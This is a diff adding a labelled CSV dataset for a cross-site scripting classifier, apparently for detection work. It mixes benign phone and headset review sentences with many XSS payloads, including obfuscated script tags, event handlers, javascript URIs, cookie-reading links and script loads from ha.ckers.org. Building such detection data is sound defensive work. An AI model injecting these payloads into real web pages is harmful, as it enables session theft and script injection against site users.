@@ -1,0 +1,309 @@
+,label,sentence
+0,attack,"<img lowsrc=""javascript:alert('xss')"">"
+1,attack,"\"";alert('xss');//"
+2,attack,<script src=http://ha.ckers.org/xss.js></script>
+3,attack,"<iMg LOwSrc=""JaVaSCripT:alerT('Xss')"">"
+4,safe,Excellent dual-purpose headset.
+5,attack,"<IMG SRC=""LIVESCRIPT:[CODE]"">"
+6,safe,If I take a picture. the battery drops a bar. and starts beeping. letting me know its dieing.
+7,attack,"<IMG SRC="" &#14;  JAVASCRIPT:ALERT('XSS');"">"
+8,safe,I can hear while I'm driving in the car. and usually don't even have to put it on it's loudest setting.
+9,attack,"<img src=/ onerror=""alert(string.fromcharcode(88.83.83))""></img>"
+10,attack,"<IMG DYNSRC=""JAVASCRIPT:ALERT('XSS')"">"
+11,attack,"<script/src=""http://ha.ckers.org/xss.js""></script>"
+12,attack,<body onload=alert('xss')>
+13,attack,<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS></SCRIPT>
+14,attack,"<IMG SRC=""JAV&#X0A;ASCRIPT:ALERT('XSS');"">"
+15,attack,<iframe src=http://ha.ckers.org/scriptlet.html <
+16,attack,"<img src=""javascript:alert('xss')"""
+17,safe,Best headset ever!!!.
+18,attack,"</title><script>alert(""xss"");</script>"
+19,attack,<IMG SRC=JAVASCRIPT:ALERT('XSS')>
+20,attack,"<INPUT TYPE=""IMAGE"" SRC=""JAVASCRIPT:ALERT('XSS');"">"
+21,attack,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+22,attack,<A ONMOUSEOVER=ALERT(DOCUMENT.COOKIE)>XXS LINK</A>
+23,attack,"<IMg SRc=""JaV&#X0A;asCRiPT:AleRt('xsS');"">"
+24,attack,"<img src=""jav&#x0a;ascript:alert('xss');"">"
+25,attack,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+26,attack,<IMG SRc=jAVAscRIPT:aleRt(strInG.fROmCharcodE(88.83.83))>
+27,attack,<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+28,safe,It didn't charge for me.
+29,attack,<IMG SRC=javascript:alert('XSS')>
+30,attack,"<IMG DYNSRC=""javascript:alert('XSS')"">"
+31,attack,"<img dynsrc=""javascript:alert('xss')"">"
+32,attack,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+33,safe,But despite these few flaws. this case is of exceptional quality and well worth the additional costs of owning an official OEM product.
+34,safe,but it is great. i would really recommend it
+35,safe,Works for me.
+36,attack," onfocus=alert(1)"" name=""bounty"
+37,attack,<a onmouseover=alert(document.cookie)>xxs link</a>
+38,safe,This is the phone to get for 25.... I just bought my S7a and all I can say is WOW!
+39,safe,cool phone.
+40,safe,I was very pleased to see that I could replace my well travled swivel holster for my Blackberry flip.
+41,attack,<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+42,attack,"'';!--""<XSS>=&{()}"
+43,safe,It always cuts out and makes a beep beep beep sound then says signal failed.
+44,safe,Saggy. floppy piece of junk.
+45,safe,Very unreliable service from T-mobile !
+46,safe,When it opens. the battery connection is broken and the device is turned off.
+47,attack,"<iMg ONmOUseOVER=""aLeRt('XXS')"">"
+48,safe,I am pairing this with my iphone. and I could not be happier with it so far.
+49,attack,"<imG dyNSrC=""JAVaSCRiPt:aLErT('Xss')"">"
+50,attack,<svg><x><script>alert(1)</x>
+51,attack,"<IMG ONMOUSEOVER=""ALERT('XXS')"">"
+52,safe,The cutouts and buttons are placed perfectly.
+53,attack,"<IMG SRC=# ONMOUSEOVER=""ALERT('XXS')"">"
+54,attack,"<SCRIPT/SRC=""HTTP://HA.CKERS.ORG/XSS.JS""></SCRIPT>"
+55,safe,"You get extra minutes so that you can carry out the call and not get cut off."""
+56,attack,<SCRIPT SRC=//HA.CKERS.ORG/.J>
+57,attack,"<body background=""javascript:alert('xss')"">"
+58,attack,"<BODY BACKGROUND=""JAVASCRIPT:ALERT('XSS')"">"
+59,attack,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
+60,safe,I have tried these cables with my computer and my iPod and it works just fine.
+61,safe,Very much disappointed with this company.
+62,safe,Otherwise. easy to install and use. clear sound.
+63,safe,Just reading on the specs alone makes you say WOW.
+64,safe,I like the fact that it rests lightly against your ear. rather than inside.
+65,attack,<script>alert(1)</script>
+66,attack,<SVG/ONLOAD=LOCATION=`JAVAS`+`CRIPT:ALE`+`RT%2`+`81%2`+`9`;//
+67,safe,I kept catching the cable on the seat and I had to pull the phone out to turn it on an off.
+68,attack,"<IMG SRC=/ ONERROR=""ALERT(STRING.FROMCHARCODE(88.83.83))""></IMG>"
+69,attack,<ScRiPT sRc=http://ha.CkERs.ORG/xSS.jS></ScRIpT>
+70,attack,"<img src=""javascript:alert('xss');"">"
+71,safe,Good show. Samsung.
+72,attack,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
+73,safe,Nice case. feels good in your hands.
+74,safe,Very satisifed with that.
+75,safe,My sister has one also and she loves it.
+76,safe,Seller shipped quickly and much cheaper than the competitors.
+77,attack,"<IMG srC=""jAVAscRiPT:aLErT('xSs');"">"
+78,safe,The mic there is a joke. and the volume is quite low.
+79,attack,"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss</br>"
+80,safe,WARNING - DO NOT BUY!!.
+81,attack,"<BODY onload!#$%&()*~+-_..:;?@[/|\]^`=alert(""XSS"")>"
+82,attack,"<IMG SRC=# onmouseover=""alert('xxs')"">"
+83,attack,<img src=javascript:alert('xss')>
+84,attack,"<IMG LOWSRC=""javascript:alert('XSS')"">"
+85,attack,<iframe src=http://ha.ckers.org/scriptlet.html <
+86,attack,"<<SCRIPT>ALERT(""XSS"");//<</SCRIPT>"
+87,safe,It is a joy to use.
+88,safe,This was utterly confusing at first. which caused me to lose a couple of very. very important contacts.
+89,attack,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+90,safe,Just does not work.
+91,safe,Logitech Bluetooth Headset is a !.
+92,attack,"<<scRiPT>aLerT(""xss"");//<</sCRipT>"
+93,safe,Happy so far!.
+94,safe,much better than the hard plastic cases.
+95,attack,"'';!--""<XSS>=&{()}"
+96,attack," onfocus=alert(1)"" name=""bounty"
+97,safe,It was quite comfortable in the ear.
+98,attack,"<IMG SRC= onmouseover=""alert('xxs')"">"
+99,attack,"<IMG SRC=""JAV&#X09;ASCRIPT:ALERT('XSS');"">"
+100,attack,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
+101,attack,"<ScRiPT/XSS Src=""HtTP://HA.cKERS.Org/Xss.JS""></sCripT>"
+102,attack," ONFOCUS=ALERT(1)"" NAME=""BOUNTY"
+103,safe,Bad Reception.
+104,safe,This is by far the worst purchase I've made on Amazon.
+105,safe,I really like this product over the Motorola because it is allot clearer on the ear piece and the mic.
+106,attack,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+107,attack,"<Img """"""><ScRiPt>ALerT(""xSS"")</ScRipt>"">"
+108,attack,<BODY ONLOAD=ALERT('XSS')>
+109,attack,"<img src=`jAvAscRiPt:aLERT(""RsNAkE says. 'XSS'"")`>"
+110,safe,The headset fulfills my requirements so I am happy with my purchase.
+111,safe,Last time buying from you.
+112,safe,Great phone.
+113,safe,I'm returning them.
+114,safe,[...] down the drain because of a weak snap!
+115,attack,<a ONmOuseOvER=AlErt(DoCuMenT.COOKIE)>Xxs link</a>
+116,attack,<IMG SRC=JAVASCRIPT:ALERT('XSS')>
+117,safe,However. the keypads are so tinny that I sometimes reach the wrong buttons.
+118,attack,"<iMg SRC= oNmOUsEOVer=""aleRT('XXs')"">"
+119,safe,Does not work for listening to music with the cingular 825.
+120,safe,Motorola finally got the voice quality of a bluetooth headset right.
+121,safe,I have only had it for a few weeks. but so far. so good.
+122,attack,"<IMG """"""><SCRIPT>ALERT(""XSS"")</SCRIPT>"">"
+123,attack,"<IMG SRC=JAVASCRIPT:ALERT(""XSS"")>"
+124,attack,<img src=javascript:alert(string.fromcharcode(88.83.83))>
+125,safe,A lot of websites have been rating this a very good phone and so do I.
+126,attack,"<IMG SRC=""JAV&#X0D;ASCRIPT:ALERT('XSS');"">"
+127,safe,It was a waste of my money. :D
+128,attack,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>"
+129,attack,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+130,attack,"<input type=""image"" src=""javascript:alert('xss');"">"
+131,attack,"<img src=javascript:alert(""xss"")>"
+132,safe,It also had a new problem.
+133,attack,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+134,attack,"<Img SRC=""jAVAscRiPT:AlerT('xSs');"">"
+135,safe,Used and dirty.
+136,safe,Good Quality.
+137,attack,"<img src=# onmouseover=""alert('xxs')"">"
+138,safe,Would recommend this item.
+139,attack,<SVG><X><SCRIPT>ALERT(1)</X>
+140,attack,"<img src=`javascript:alert(""rsnake says. 'xss'"")`>"
+141,safe,Buttons are too small.
+142,safe,Not nearly as good looking as the AMAZON picture makes it look.
+143,attack,"<SCRIPT/XSS SRC=""HTTP://HA.CKERS.ORG/XSS.JS""></SCRIPT>"
+144,attack,<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+145,safe,Does not charge the Cingular (ATT) 8525 phone.
+146,safe,Just really good.. So far. probably the best BT headset I have ever had.
+147,attack,"<iMg Src=# OnmOuseOVer=""ALerT('xxS')"">"
+148,safe,Poor Reliability.
+149,attack,"<sTYlE>Li {LIsT-StYLE-IMAge: Url(""jaVAscRipT:ALErT('xss')"");}</styLe><UL><Li>xss</Br>"
+150,attack,"<IMG SRc=""jaV&#X09;AsCrIPT:ALeRT('xsS');"">"
+151,safe,Terrible product. and waste of money!
+152,attack,"'';!--""<XSS>=&{()}"
+153,attack,<script>alert(1)</script>
+154,safe,(It works!)
+155,attack,"<img src=""jav&#x09;ascript:alert('xss');"">"
+156,attack,"<img src="" &#14;  javascript:alert('xss');"">"
+157,attack,<BodY OnlOAD=alERT('XSS')>
+158,attack,"<imG SrC=/ oNERroR=""ALErT(StRINg.fROMcHARCodE(88.83.83))""></IMg>"
+159,safe,While I managed to bend the leaf spring back in place. the metal now has enough stress that it will break on the next drop.
+160,attack,"<img src= onmouseover=""alert('xxs')"">"
+161,safe,I does not maintain a connection with the computer while it is on my lap.
+162,attack,"<IMG SRC=""javascript:alert('XSS')"""
+163,attack,"<script/xss src=""http://ha.ckers.org/xss.js""></script>"
+164,safe,It seems completely secure. both holding on to my belt. and keeping the iPhone inside.
+165,attack,&#39;&#88;&#83;&#83;&#39;&#41;>
+166,attack,"<BOdy oNLoAD!#$%&()*~+-_..:;?@[/|\]^`=ALert(""xss"")>"
+167,safe,Works fine. :D
+168,attack,"\"";ALERT('XSS');//"
+169,attack,"<BODY ONLOAD!#$%&()*~+-_..:;?@[/|\]^`=ALERT(""XSS"")>"
+170,attack,"<IMG SRC=javascript:alert(""XSS"")>"
+171,attack,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
+172,attack,<img src=&#x6a&#x61&#X76&#x61&#X73&#X63&#x72&#x69&#X70&#x74&#X3A&#X61&#X6c&#X65&#X72&#X74&#x28&#X27&#X58&#X53&#X53&#X27&#X29>
+173,attack,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">"
+174,attack,<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS?< B >
+175,attack,"<img onmouseover=""alert('xxs')"">"
+176,attack,<svg><x><script>alert(1)</x>
+177,attack,<script src=//ha.ckers.org/.j>
+178,safe,These products cover up the important light sensor above the ear outlet.
+179,attack,"<IMG SRC=""javascript:alert('XSS');"">"
+180,safe,Leopard Print is wonderfully wild!.
+181,safe,Never got it!!!!!
+182,safe,This product is very High quality Chinese CRAP!!!!!!
+183,attack,"<IMG SRC=""JAVASCRIPT:ALERT('XSS');"">"
+184,attack,<SCRIPT SRC=//ha.ckers.org/.j>
+185,safe,As I said above....PRETTY USELESS!
+186,attack,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+187,attack,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
+188,attack,"<IMG SRC='VBSCRIPT:MSGBOX(""XSS"")'>"
+189,attack,<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+190,attack," oNFOcus=AlERT(1)"" Name=""BOUntY"
+191,attack,<SCRIPT>ALERT(1)</SCRIPT>
+192,attack,"<iMG SrC=JAvaScRipT:AlErT(""xsS"")>"
+193,attack,"<IMG SRC=""JAVASCRIPT:ALERT('XSS')"""
+194,safe,I have had mine for about a year and this Christmas I bought some for the rest of the family.
+195,attack,<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88.83.83))>
+196,safe,How stupid is that?
+197,safe,I bought two of them and neither will charge.
+198,safe,It is easy to turn on and off when you are in the car and the volume controls are quite accessable.
+199,attack,"</Title><ScRiPt>Alert(""xss"");</scRIPT>"
+200,attack,"<iMG SrC=""jav&#x0d;asCRIpt:aleRT('xss');"">"
+201,attack,<scRiPt>AlERT(1)</ScRIPT>
+202,safe,So I had to take the battery out of the phone put it all back together and then restart it.
+203,safe,Everything about this product is wrong.First
+204,safe,The only good thing was that it fits comfortably on small ears.
+205,safe,Excellent product for the price.
+206,attack,<sVG/onLoAD=lOCAtion=`JaVas`+`cRipt:AlE`+`rT%2`+`81%2`+`9`;//
+207,attack,<BODY ONLOAD=alert('XSS')>
+208,attack,&#39;&#88;&#83;&#83;&#39;&#41;>
+209,attack,"<IMG LOWSRC=""JAVASCRIPT:ALERT('XSS')"">"
+210,attack,"<imG SrC='VbsCripT:msGboX(""Xss"")'>"
+211,attack,<IMG SRC=&#X6A&#X61&#X76&#X61&#X73&#X63&#X72&#X69&#X70&#X74&#X3A&#X61&#X6C&#X65&#X72&#X74&#X28&#X27&#X58&#X53&#X53&#X27&#X29>
+212,attack,"<BODY BACKGROUND=""javascript:alert('XSS')"">"
+213,attack,<ifRAme sRC=hTTP://ha.cKeRS.org/SCriptlEt.HtmL <
+214,attack,<sCrIPT sRC=//hA.ckeRs.ORG/.J>
+215,attack,"<IMG onmouseover=""alert('xxs')"">"
+216,safe,Also makes i0So I bought about  of these and saved alot of money.
+217,attack,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+218,safe,Don't trust their website and don't expect any helpful support.
+219,attack,"<ImG SRc=""JAVaSCRiPt:aleRt('xSS')"""
+220,attack,<script src=http://ha.ckers.org/xss.js?< b >
+221,safe,I didn't want the clip going over the top of my ear. causing discomfort.
+222,attack,<img src=javascript:alert('xss')>
+223,safe,Makes it easier to keep up with my bluetooth when I'm not wearing it.
+224,attack,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+225,attack,"\"";alert('XSS');//"
+226,attack,"<ScrIPT/src=""hTTp://ha.CkerS.OrG/xSS.Js""></sCRipT>"
+227,safe,However. after about a year. the fliptop started to get loose and wobbly and eventually my screen went black and I couldn't receive and place calls.
+228,safe,Love it.. Great armband.
+229,attack,"<body onload!#$%&()*~+-_..:;?@[/|\]^`=alert(""xss"")>"
+230,safe,I received my headset in good time and was happy with it.
+231,attack,<SVG><SCRIPT>ALERT(1)<P>
+232,attack,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">"
+233,safe,The speaker is of low quality so as making the ring tones sound very cheap.
+234,safe,The bottowm line...another worthless. cheap gimmick from Sprint.
+235,safe,Works good.
+236,attack,<IMG SRC=javascript:alert(String.fromCharCode(88.83.83))>
+237,attack,"<IMG SRC=""JAVASCRIPT:ALERT('XSS');"">"
+238,attack,"<img src=""jav&#x0d;ascript:alert('xss');"">"
+239,attack,"<BoDy bAckgroUNd=""jAvascript:AlErT('Xss')"">"
+240,attack,<IMG srC=JAvASCriPt:AlERt('xSs')>
+241,attack,"\"";alerT('xSS');//"
+242,safe,Problem is that the ear loops are made of weak material and break easily.
+243,attack,<IMG SRC=JaVaScRiPt:alert('XSS')>
+244,attack,&#39;&#88;&#83;&#83;&#39;&#41;>
+245,attack,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+246,safe,I love being able to use one headset for both by land-line and cell.
+247,attack,<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+248,safe,It was that loud.Glad to say that the Plantronics 5 maintains a flawless connection to my cell and with no static during normal use.
+249,attack,"<img src=""javascript:alert('xss');"">"
+250,attack,"<ImG SrC="" &#14;  JAvasCRIPT:AlErT('Xss');"">"
+251,attack,"<A ONMOUSEOVER=""ALERT(DOCUMENT.COOKIE)"">XXS LINK</A>"
+252,safe,This is an excellent tool. especially when paired with your phone's auto-answer.
+253,attack,<sVg><x><ScRipT>AlerT(1)</x>
+254,safe,I was very impressed with the price of the cases.
+255,attack,"<IMG SRC=""javascript:alert('XSS');"">"
+256,safe,The item received was Counterfeit.
+257,safe,It's been my choice headset for years.Great sound; good volume; good noise cancellation.
+258,attack,<SCrIPT sRc=HttP://HA.ckeRS.ORG/xSS.js?< b >
+259,attack,"<img src='vbscript:msgbox(""xss"")'>"
+260,attack,"<img """"""><script>alert(""xss"")</script>"">"
+261,attack,"<A ONMouSEovEr=""ALERt(DOCuMENT.COOkIe)"">xxS linK</a>"
+262,safe,It looses connection to the phone even when it is within a couple feet between the two.
+263,safe,nice leather.
+264,safe,Couldn't figure it out
+265,safe,Excellent!.
+266,safe,I have read other's reviews here but I haven't had any problem with it.
+267,safe,The pairing of the two devices was so easy it barely took a couple minutes before I started making calls with the voice dialing feature.
+268,safe,Comfortable in my hand.
+269,safe,Don't buy this product - It fails!.
+270,safe,Not good enough for the price.
+271,attack,"</TITLE><SCRIPT>ALERT(""XSS"");</SCRIPT>"
+272,safe,Fits comfortably. came with three sizes of earbud tips.
+273,safe,It looks very nice.
+274,attack,<svg><script>alert(1)<p>
+275,attack,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+276,safe,So far it has worked like a charm.
+277,attack,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88.83.83))""></img>"
+278,safe,I had to purchase a different case.
+279,attack,"'';!--""<xss>=&{()}"
+280,attack,"<IMG SRC=""livescript:[code]"">"
+281,attack,"<<script>alert(""xss"");//<</script>"
+282,attack,&#39;&#88;&#83;&#83;&#39;&#41;>
+283,attack,<svg><script>alert(1)<p>
+284,attack,"<IMG SRC="" &#14;  javascript:alert('XSS');"">"
+285,attack,"<STYLE>LI {LIST-STYLE-IMAGE: URL(""JAVASCRIPT:ALERT('XSS')"");}</STYLE><UL><LI>XSS</BR>"
+286,attack,"<IMG SRC=`JAVASCRIPT:ALERT(""RSNAKE SAYS. 'XSS'"")`>"
+287,attack,<a onmouseover=alert(document.cookie)>xxs link</a>
+288,safe,Having trouble with volume.
+289,attack,"<iMG src=""LiveScRIPt:[cODe]"">"
+290,attack,<imG SrC=jAvAsCRipT:aLeRT('xSS')>
+291,attack,"<IMG SRC='vbscript:msgbox(""XSS"")'>"
+292,attack,"<a onmouseover=""alert(document.cookie)"">xxs link</a>"
+293,attack,"<IMG SRC= ONMOUSEOVER=""ALERT('XXS')"">"
+294,attack,"<INPut tyPe=""IMagE"" SRC=""JaVasCRipt:alerT('xSS');"">"
+295,attack,"<IMG SRC=`javascript:alert(""RSnake says. 'XSS'"")`>"
+296,attack,<IMG SRc=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+297,attack,"<img src=""livescript:[code]"">"
+298,safe,I exchanged the sony ericson z5a for this and I'm pretty happy with that decision.
+299,safe,Terrible phone holder.
+300,attack,<SVG><scRipt>aLERT(1)<P>
+301,safe,But. in any case. the best part is. you can download these pictures to your laptop using IR. or even send pictures from your laptop to the phone.
+302,attack,<IFRAME SRC=HTTP://HA.CKERS.ORG/SCRIPTLET.HTML <
+303,attack,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
+304,attack,"<a onmouseover=""alert(document.cookie)"">xxs link</a>"
+305,attack,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+306,safe,My phone sounded OK ( not great - OK). but my wife's phone was almost totally unintelligible. she couldn't understand a word being said on it.
+307,safe,This pair of headphones is the worst that I have ever had sound-wise.
